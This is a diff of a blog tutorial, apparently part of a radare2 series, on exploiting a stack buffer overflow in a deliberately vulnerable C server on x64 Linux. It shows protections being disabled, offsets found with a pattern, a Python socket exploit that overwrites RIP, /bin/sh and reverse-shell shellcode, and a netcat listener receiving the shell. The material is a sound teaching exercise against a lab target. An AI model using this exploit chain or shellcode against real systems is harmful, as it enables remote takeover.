@@ -6,6 +6,34 @@ featured_image_thumbnail: assets/images/radare2/radare2_20.png
 featured_image: assets/images/radare2/radare2_20.png
 ---
 
+And after a very well deserved rest, here we go again. While these tutorials are generally aimed at developing skills in reverse engineergin using open source tools such as radare2 when possible I think that a general knowledge on basic exploitation techniques is a must, as most of the times you'll find malware using exploits to gain access to the system, you'll see your own projects failing due to mistakes that can be vulnerabilities and overall knowing about explotation will make things easier for you, as you will get a wider picture. 
+
+So as we need to begin with something, we will begin with one of the simplest examples, a buffer overflow on a server program executed inside a x64 Linux system. 
+
+
+#### (stack) Buffer overflows
+
+A buffer overflow vulnerability is the starting point for exploiting and it appears whenever we try to fill a buffer of size N with content the size >N so whatever we write fills the buffer AND the remains fill the adjacent positions in the stack. Not all buffer overflows have to end in a severe vulnerability, the vulnerability will appear when we start over writting memory positions that are needed for the correct execution of the program, that will lead to a failure. If we are smart enough to carefully identify what are we overwritting and its function in the execution flow of the program, we might be able to control that execution flow and make the machine running the vulnerable software run stuff of our own.
+
+Creating a buffer in C is as simple as the following:
+```C
+char buffer[50]
+```
+That piece of code, as we already know creates an array (buffer) of 50 bytes (char) if we try to write more than 50 bytes there, we have a buffer overflow.
+
+#### The stack
+
+The stack is a last in first out data structure. Two operations can be done there: PUSH to insert data on TOP and POP to retrieve the first element there (retrieve the element, remove it from the stack). During the execution of a program, a stack is used during function calls to create the associated stack frames for each function call. It also stores the return address of the function, that is the address to which control has to be passed when a function returns.
+
+The following image from buff3r(medium) summarizes it:
+
+![Stack](https://miro.medium.com/max/1156/1*Io2pbNYn8PeJCpSdNK8O8w.jpeg)
+
+As we see, the parameters (arguments) of a function are pushed on the stack followed by the "return address" (that is, the valie un register RIP) and the frame / base pointer (RBP) which points to the base of the previous stack frame. A stack frame is a memory management technique used in some programming languages for generating and eliminating temporary variables. In other words, it can be considered the collection of all information on the stack pertaining to a subprogram call. Stack frames are only existent during the runtime process. .In the x64 world as we know from previous tutorials, the first six arguments are not pushed on the stack at all but stored in registers, in x32 all is pushed on the stack [read more](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/).  
+
+When a function returns, the "saved return address" is "popped" from the stack and loaded inside RIP (instruction pointer) and the execution continues from there. In your typical stack overfflow, you'll be concerned on how to overwrite this "saved return address" in the stack with another address that'll point to whenver you want your program to continue the exection, mostly you'll try to make the program jump to your shellcode (to spawn a shell or something).
+
+So let's get our hands into it. In this example we will be using the [Vulnerable Server](https://github.com/dennis95stumm/Vulnerable-Server) that's a server written in C which is vulnerable to several very basic attacks. We can download and compile it inside a, for example ubuntu 18.04 LTS x64 bits.
 
 ```C 
 /**
@@ -228,7 +256,25 @@ int main(int argc, char* argv[]) {
 }
 ```
 
+We'll have to compile it the following way:
+```
+gcc -fno-stack-protector -no-pie -z execstack
+```
+As otherwise, we'll face more advanced protection measures against this kind of basic attacks. As for example, by default DEP marks sections of the memory of our programs such as the stack as non executable, so we can overflow the stack but do nothing on it. Canaries can also be used to mark buffer sections and thus detect if buffer overflows are happening and kill the program to avoid the exploit. [Read about them](https://en.wikipedia.org/wiki/Buffer_overflow_protection). By using the params/flags presented in the gcc command, we make sure we can play with our vulnerable server and replicate this tutorial.
 
+You may also want to disable ASLR for this one:
+
+```
+echo 0 > /proc/sys/kernel/randomize_va_space
+```
+As it randomizes memory addresses to avoid attackers hardcode addresses to memory positions such as relevant function calls etc [Read about ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) We'll be hardcoding stuff in here so consider it.
+
+Let's get to it then. After compiling the program we can run it in radare2 debug mode with 
+
+```
+radare2 -dAAA vulnserver 8081
+``` 
+Then as usual we can inspect the functions:
 ```
 [0x000009b0]> afl
 0x00000000    2 64           sym.imp.__libc_start_main
@@ -265,7 +311,7 @@ int main(int argc, char* argv[]) {
 0x00000e74    1 9            sym._fini
 [0x000009b0]> 
 ```
-
+And jump to main to start seeing what it does:
 ```
 [0x000009b0]> s 0x00000da6
 [0x00000da6]> pdf
@@ -304,7 +350,7 @@ int main(int argc, char* argv[]) {
 \           0x00000dfd      c3             ret
 [0x00000da6]> 
 ```
-
+And we will quickly see that the main is basically used for the program initialization, params loading and such and to quickly jump to "start()", so we move there:
 ```
 [0x00000da6]> s 0x00000cc9
 [0x00000cc9]> pdf
@@ -375,7 +421,7 @@ int main(int argc, char* argv[]) {
 \       `=< 0x00000da4      ebe5           jmp 0xd8b                   ; vulns.c:197     fflush(stdout);
 [0x00000cc9]> 
 ```
-
+Then in start, a seasoned exploiter will quickly jump and identify the "recv" function as something potentially dangerous:
 ```
 :135   recv_size = recv(fd, secret_buffer, 1024, 0);
 |           0x00000bcd      8b45fc         mov eax, dword [local_4h]
@@ -388,18 +434,16 @@ int main(int argc, char* argv[]) {
 |       ,=< 0x00000be8      7f1b           jg 0xc05
 |       |   0x00000bea      488d3d270700.  lea rdi, qword str.Connection_close ; vulns.c:138     printf("Connection close!\n"); ; 0x1318 ; "Connection
 ```
+At this point, the normal thing is to start paying attention to functions that actually receive data "from the outside" and place it somewhere on memory. One of the main problems in here can be an actual buffer overflow. How to identify it? We can debug the program while sending a big chunk of information (example: >1000bytes) and see where and how it gets placed in memory. We can also quickly inspect the stack and start to think about the space we have and how our buffer won't fit in there:
 
-
-
-
+So we set some breakpoints in here:
 ```
 db 0x555555554b3e
 db 0x555555554c5a
 
 s 0x555555554b3e
 ```
-
-
+And then we can use some simple python script to send that buffer, like this:
 ```
 import socket
 import sys
@@ -412,8 +456,7 @@ s.send(payload)
 
 s.close()
 ``` 
-
-
+We start the program and allow the execution with "dc"
 ```
 [0x555555554b3e]> dc
 Waiting for connections...
@@ -424,7 +467,7 @@ child stopped with signal 11
 [+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
 [0x555555554b3d]> 
 ```
-
+And after the buffer gets sent by recv we see how the program crashes. After a program crash we need to start focusing on two things mainly, especially in situations like this one. The state of the registers and the Stack. We'll need to see what registers we can control and if/what space in memory do we have to place shellcode in it:
 ```
 [0x555555554b3d]> dr
 rax = 0x41414141
@@ -448,9 +491,7 @@ rflags = 0x00010286
 orax = 0xffffffffffffffff
 [0x555555554b3d]> 
 ```
-
-
-
+So we inspect the registers and the stack and we see that we can control a decent amount of space as well as we have full control of RBP, nice!
 ```
 [0x555555554b3d]> dr rbp
 0x4141414141414141
@@ -475,18 +516,20 @@ orax = 0xffffffffffffffff
 0x7fffffffdba4  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA
 [0x555555554b3d]> 
 ```
+So right now two things can be done, the first one, to identify a space in memory to place our shellcode, the second one to identify the position in which we override our registers, being RBP one of interest.
 
+We can use some tool like [The pattern generator script](https://github.com/Svenito/exploit-pattern) to generate a pattern of chars to send as "fuzzing", then we can use the same script to identify the positions in which we overwrite memory:
 ```
 lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 1000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
 ```
-
+So we generate and launch the pattern:
 ```
 lab@lab-VirtualBox:~/exploit-pattern$ nc localhost 8081
 Welcome! Please enter the secret text:
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
 ```
-
+And then we inspect the registers again:
 ```
 [0x555555554b3d]> dr
 rax = 0x35624134
@@ -530,7 +573,7 @@ orax = 0xffffffffffffffff
 0x7fffffffdc28  0x6c41396b 0x316c4130 0x41326c41 0x6c41336c  k9Al0Al1Al2Al3Al
 0x7fffffffdc38  0x356c4134 0x41366c41 0x6c41376c             4Al5Al6Al7Al
 ```
-
+And we use the same tool, by copying and pasting those hex values:
 ```
 lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x37674136
 Pattern 0x37674136 first occurrence at position 200 in pattern.
@@ -538,7 +581,7 @@ Pattern 0x37674136 first occurrence at position 200 in pattern.
 lab@lab-VirtualBox:~/exploit-pattern$ python3 pattern.py 0x6241376241366241
 Pattern 0x6241376241366241 first occurrence at position 48 in pattern.
 ```
-
+And now, as we know the positions of our payload where we overwrite specific values, we can try to land some marks in there to make sure we do have full control on them:
 ```
 from struct import pack
 import socket
@@ -554,7 +597,7 @@ s.send(payload)
 
 s.close()
 ```
-
+We launch the script again, check the registers and:
 
 ```
 [0x555555554b3d]> dr
@@ -594,13 +637,22 @@ orax = 0xffffffffffffffff
 0x7fffffffdbe8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
 0x7fffffffdbf8  0xcccccccc 0xcccccccc 0xcccccccc 0xcccccccc  ................
 ```
+Awesome, we control the stack, RBP and we have room for our shellcode.
+
+So from now, we have it clear that, for example a nice place to start landing shellcode in memory will be the position: 0x7fffffffdba8 why? because we can start writing there, it can be 2 bytes after or before in our case, we select that because it makes a nice 200 padding thats all.
+
+So we will want the RIP register to point 0x7fffffffdba8 after the crash. How to do it? As we have control over RBP, we know that the 64 bits after the stack frame contain the return value, when the function returns, the return value is popped into RIP, so the program can resume execution of the calling function. We know that the value of the "saved frame/base pointer" will be overwritten past the first 48 bytes, the "saved return address" goes right after so 48+8 bytes and then we overwritte the "saved return address" that will go into RIP, so we write the address of our shellcode in there:
+
+Also remember, that when you send a buffer/chunk that needs to be interpreted as a memory address, you need to check for the endianness, Little Endian in this case. [Read about it](https://embetronicx.com/tutorials/p_language/c/little-endian-and-big-endian/)
+
+Se we'll send a buffer, for the overfflow, then the RIP address then some nops and \xCC (opcode for breakpoint, so we can pause the program and see if it's working)
 
 ``` 
 rip = 0x7fffffffdba8
 
 payload = b"\x41"*48 + b"\x90"*8 + pack("<Q", rip) + b"\x90"*170 + b"\xCC"*200 +b"\x90"*800 
 ```
-
+We send that and:
 
 ```
 [0x7ffff7dd4090]> dc
@@ -622,7 +674,10 @@ Got connection!
             0x7fffffffdc24      cc             int3
 [0x7fffffffdc1b]> 
 ```
+RIP gets overwritten and we jump right into our shellcode. Right now it is all breakpoints, so nothing gets executed though we now have full control of the execution.
 
+
+At this point you'll usually want to run shellcode, something useful, run some program, install malware, run a reverse shell etc. Sites like exploit-db, packetstormsecurity or a bunch of github sites do contain shellcode you can read and integrate. Here I'll start by using a simple /bin/sh shellcode:
 
 ```
 0000000000400080 <_start>:
@@ -639,7 +694,7 @@ Got connection!
 
 \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
 ```
-
+We can basically copy and paste the hex, after understanding it:
 ```
 [0x7fffffffdc13]> ds
 [0x7fffffffdc13]> pd 10
@@ -656,7 +711,9 @@ Got connection!
             0x7fffffffdc1e      4831f6         xor rsi, rsi
 [0x7fffffffdc13]> 
 ```
+And we see how those int3 instructions go right before the shellcode now.
 
+We can jump into something more advanced, like a reverse shell [I took from here](https://packetstormsecurity.com/files/160996/Linux-x64-Reverse-Shell-Shellcode.html)
 ```
 0:  6a 29                  push   0x29
    2:  58                     pop    rax
@@ -736,7 +793,7 @@ void main()
   ret();
 
 ```
-
+And that can be integrated into our initial exploit like this:
 ```
 from struct import pack
 import socket
@@ -757,10 +814,7 @@ s.send(payload)
 s.close()
 
 ```
-
-
-
-
+And then, as we see, it gets executed:
 
 ```
 [0x7fffffffdc13]> pd 10
@@ -795,9 +849,7 @@ s.close()
             0x7fffffffdc26      50             push rax
             0x7fffffffdc27      5f             pop rdi
 ```
-
-
-
+Granting us full access to a reverse shell :)
 ```
 ^V^Clab@lab-VirtualBox:~/exploit-pattern$ nc -lvp 4444
 Listening on [0.0.0.0] (family 0, port 4444)
@@ -807,13 +859,19 @@ ls
 ls -lah
 ps
 pwd
-Descargas
-Documentos
-Escritorio
-Imágenes
-Música
-Plantillas
+Downloads
+Documents
+Desktop
 ```
+And ending this tutorial...
 
 
+This has been a very basic tutorial, acting like a warm up for what is about to come. Please understand that we all do start from the very beggining at some point and this is necessary to build advanced stuff on top of it.
 
+I hope it becomes useful for you guys. As a challenge I dare you to chance the C code to make the SOCKET FILE DESCRIPTOR a global variable and teak your exploit to trigger the EGG function :)
+
+
+If yoou want to read more about x64 buffer overflows on Linux, check this out
+
+[Buffer Overflow x64](https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558)
+[More about buffer overflows on x64](https://samsclass.info/127/proj/ED402.htm)
